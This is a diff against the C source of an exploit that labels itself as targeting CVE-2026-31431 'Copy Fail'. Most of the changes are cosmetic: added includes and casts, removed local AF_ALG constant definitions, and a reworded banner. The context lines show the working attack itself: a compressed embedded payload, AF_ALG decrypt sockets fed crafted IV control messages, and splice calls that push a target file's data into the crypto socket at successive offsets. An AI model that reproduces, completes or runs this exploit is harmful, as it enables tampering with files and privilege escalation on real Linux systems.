@@ -1,5 +1,4 @@
-// copy_fail.c - Exploit CVE-2026-31431 "Copy Fail"
-
+#define _GNU_SOURCE
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
@@ -11,15 +10,7 @@
 #include <zlib.h>
 #include <errno.h>
 
-#define AF_ALG 38
 #define SOL_ALG 279
-
-#define ALG_SET_KEY             1
-#define ALG_SET_OP              2
-#define ALG_SET_IV              3
-#define ALG_SET_AEAD_ASSOCLEN   4
-#define ALG_SET_AEAD_AUTHSIZE   5
-
 #define ALG_OP_DECRYPT 0
 
 static const unsigned char compressed_payload[] = {
@@ -39,7 +30,7 @@ int main(void) {
     uLongf payload_len = 1024;
     int i;
 
-    printf("[*] CVE-2026-31431 - Copy Fail exploit (C version)\n");
+    printf("[*] CVE-2026-31431 - Copy Fail exploit\n");
 
     payload = malloc(payload_len);
     if (!payload) {
@@ -72,7 +63,10 @@ int main(void) {
         };
 
         sock = socket(AF_ALG, SOCK_SEQPACKET, 0);
-        if (sock < 0) { perror("socket"); break; }
+        if (sock < 0) { 
+            perror("socket"); 
+            break; 
+        }
 
         if (bind(sock, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
             perror("bind");
@@ -111,7 +105,7 @@ int main(void) {
         cmsg->cmsg_type = ALG_SET_IV;
         cmsg->cmsg_len = CMSG_LEN(20);
         memset(CMSG_DATA(cmsg), 0, 20);
-        ((char*)CMSG_DATA(cmsg))[0] = 0x10;
+        ((unsigned char*)CMSG_DATA(cmsg))[0] = 0x10;
 
         cmsg = CMSG_NXTHDR(&msg_hdr, cmsg);
         cmsg->cmsg_level = SOL_ALG;
@@ -129,7 +123,7 @@ int main(void) {
 
         int pipefd[2];
         if (pipe(pipefd) == 0) {
-            long offset = i;
+            long offset = (long)i;
             splice(target_fd, NULL, pipefd[1], NULL, offset + 4, SPLICE_F_MOVE);
             splice(pipefd[0], NULL, opsock, NULL, offset + 4, SPLICE_F_MOVE);
             close(pipefd[0]);
